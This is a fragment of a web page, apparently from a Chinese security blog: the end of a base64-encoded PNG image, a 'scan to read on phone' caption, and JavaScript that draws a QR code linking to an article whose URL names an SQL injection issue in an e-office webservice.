3in/kDSC6uc348wDx/9DDj7BCfOthznt95beBaF74szfw9EBgnLLHhujymvJ+qYsw5mHk5vY96lldhNSV5+qe/MyH9DIvwqjbRzQnrnT9juYh+wDXnyG3N/ta/h92+jn7NPXV5fAxbUB5w1+/ft1/z1Xo9erA/fd3CKo/QnicXe31qOfeg/SHoB6EQ1D9DOGYf/q3rLPml/93bmAbCBynVVv0t0ouVqZW56XVgvSFYGn7BXPdjH1XCKkHLDkgMHzaeq9eoN/1ziF91XsdxFeHkfe6ym0D0bzwZ29g+zGgms5+eSzIVGHE7svtseKQPvoizHX9jpC8+xWaqedakIy6CHNdvyMkXz1r6ddzLTmMufJqwaibn+H1CZndyg9qh/+VBZkmBPvZauK1YO73/LO8es4WZB8I2s8sRIePH7aGaGZ6Tde737l5eNzXOkgOgtZ3v+vlX5+QuoU3WtufIZ7JqXXUh8dTN2d95+qQPvoizHV9EdY59zArQmpgRPMw6r3OnLoIqdMX9UUYc+p7vD4h+9t4g+fDnyFnZ3L6ME676/aB5Do3v9JhrFvl1GcI8x7uLfbalQ7pByP2PMTvfeUQH4LqhdcnpG7hjdY2EDhOa3ZOSM63AsJ7FqKb6768+zDWdb9z+xRCauv50YLHOYgPQXu5t6gOyUFQX4RRt26G20Bm5qW9/gaWA4FMFYJOW4RR9+j6ckhOvvLVRfOQ+pVurrBn5GJlaskhvSFY3myd5fVFe8C87yoHXP895PZmX8tPiFMUIdOGYNf9dUF8+SrXfTmkHoLqIsx1/T1CshBcnUVd3PfYP3e/c8g+1qx8mOcqvxyITS987Q0cBgKZHgQ9Tk1vv9Q7mlGHsU/XYe6b69j7d/8Rh3Eve0F0CKqLveezOqTfWT0kB1x/htze7Ovwd1meb/UWQKZpToRRt140d4bmO1oH4z7qhRAPgqU9WnCWG6sheQjqQjiMqP8ZPPyW9ZniK/v3b2D7u6zVG9m3NNd1OczfEusgvvkzhOQhaN5+M3wms6/recheENQXrYXRV+9onQipM6deeH1C6hbeaG1/hkCmBs9h/zU4bbH7kL5dl0N8GNF+onkRPvJqHeEjA3T7/nNi1V+jnvdLvaOZrgP3n3Lputw6OOauT4i39Ca4DcSpnWE/t/mVDuNbcJZf+b2/3HyhmgjZu7z9gujmRIgOwa7Lz9C9znIzfxvIzLy019/AYSCQtwNG/OzRIPW+LeKzfcxD+kDQegiHI5qxhxySVYdwfXUR4stFiG6dCNFhRP1n8DCQZ4quzL+7gW8PBB6/DTD6EH72S4LkfCtXef1CM/VcSy6WVgvSW12EUa9sre6XVguSr+da5uq5llwsrdaKl/7tgVSTa/29G/jrA4G8Nasj1htSS7+ea8kh9aXVgnD90mrJHyGkFkas+lrWQvzSakE4BM2VV0suwphTfxarp+uvD+TZQ1y5+Q0cBuKkOs7Lb9t3uebNyUV1sevw+C0zD2MOwgFb379Lho+f9bV2CywegHuttnUw6hCuL1onqovqkHr5Hg8D2ZvX8+tvYBsIZGrwGFdHhNT5NkD4WR6Ss060Tg7JdV1eaLae9wvGWhj5V+vcA9Kv94HoMGKvgw9/G4ihC3/2Bq6B/Oz9H3b/HwAAAP//9WPAhgAAAAZJREFUAwBGS2vX6mz7tQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 